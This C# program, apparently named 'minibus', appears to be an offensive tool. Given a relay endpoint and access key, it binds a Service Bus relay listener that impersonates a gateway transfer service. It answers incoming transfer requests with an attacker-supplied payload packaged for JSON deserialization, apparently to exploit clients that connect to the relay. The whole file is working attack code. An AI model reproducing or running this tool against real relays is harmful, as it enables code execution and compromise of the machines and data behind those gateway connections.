using Microsoft.ServiceBus;
using System;
using System.ServiceModel;
using System.Threading.Tasks;
using System.Threading;
using Newtonsoft.Json;
using System.Text;

namespace minibus
{
	[ServiceBehavior(ConcurrencyMode = ConcurrencyMode.Multiple, InstanceContextMode = InstanceContextMode.Single, UseSynchronizationContext = false)]
	class GatewayTransferService : IGatewayTransferService
	{
		public Task PingAsync() {
			return new Task(() => Console.WriteLine("[=] GatewayTransferService.PingAsync()"));
		}

		public Task TransferAsync(byte[] bytes)
		{
			Console.WriteLine("[=] GatewayTransferService.TransferAsync()");

			//Console.WriteLine(" |- Raw:\n");
			//Console.WriteLine(Hex.Dump(bytes));

			RelayPacket packet = new RelayPacket()
			{
				Blob = bytes
			};

			Console.WriteLine(" |- Header: " + JsonConvert.SerializeObject(packet.Header));
			//Console.WriteLine(" |- Data: " + Encoding.Unicode.GetString(packet.Blob, RelayPacketHeader.Size, packet.Header.UncompressedDataSize));

			var response = Encoding.Unicode.GetBytes(Globals.Payload);
			byte[] responseBytes = new byte[response.Length + RelayPacketHeader.Size];

			new RelayPacketHeader()
			{
				HasCorrectDataSize = true,
				IsLast = true,
				Index = 0,
				UncompressedDataSize = response.Length,
				CompressedDataSize = response.Length,
				CompressionAlgorithm = XPress9Level.None,
				DeserializationDirective = DeserializationDirective.Json
			}.Serialize(responseBytes);

			Array.Copy((Array)response, 0, (Array)responseBytes, RelayPacketHeader.Size, response.Length);

			Console.WriteLine($" |- Sending response ({responseBytes.Length})\n");
			Console.WriteLine(Hex.Dump(responseBytes));

			Globals.Running = false;

			IGatewayTransferCallback callback = OperationContext.Current.GetCallbackChannel<IGatewayTransferCallback>();
			return callback.TransferCallbackAsync(responseBytes);
		}
	}

	class Program
    {
		static void Main(string[] args)
        {
			if (args.Length != 3 || !args[0].StartsWith("sb:") || !args[2].StartsWith("A"))
            {
				Console.WriteLine();
				Console.WriteLine("[!] Invalid Arguments");
				Console.WriteLine();
				Console.WriteLine("\tminibus.exe <BusEndpoint> <AccessKey> <Payload>");
				Console.WriteLine("\tminibus.exe [sb://...] [...] [AA...]");
				Console.WriteLine();

				return;
			}

			Globals.Endpoint = args[0];
			Globals.Key = args[1];
			Globals.Payload = Globals.Payload.Replace("**PAYLOAD**", args[2]);

			Console.WriteLine($"[+] Binding to {Globals.Endpoint} ...");

			ServiceBusEnvironment.SystemConnectivity.Mode = ConnectivityMode.Http; // Don't miss this, otherwise shit breaks

			ServiceHost serviceHost = new ServiceHost(typeof(GatewayTransferService));
            serviceHost.AddServiceEndpoint(typeof(IGatewayTransferService), new NetTcpRelayBinding() { IsDynamic = false }, Globals.Endpoint)
                .Behaviors.Add(new TransportClientEndpointBehavior
                {
                    TokenProvider = TokenProvider.CreateSharedAccessSignatureTokenProvider(Globals.KeyName, Globals.Key)
                });

			serviceHost.Open();

			Console.WriteLine($"[+] Relay opened");

			while(Globals.Running)
            {
				Thread.Sleep(100);
			}

			serviceHost.Close();

			Console.WriteLine($"[-] Relay closed");
			Console.WriteLine($"\n (any key to exit)");
			Console.ReadKey();

			return;
        }
    }
}
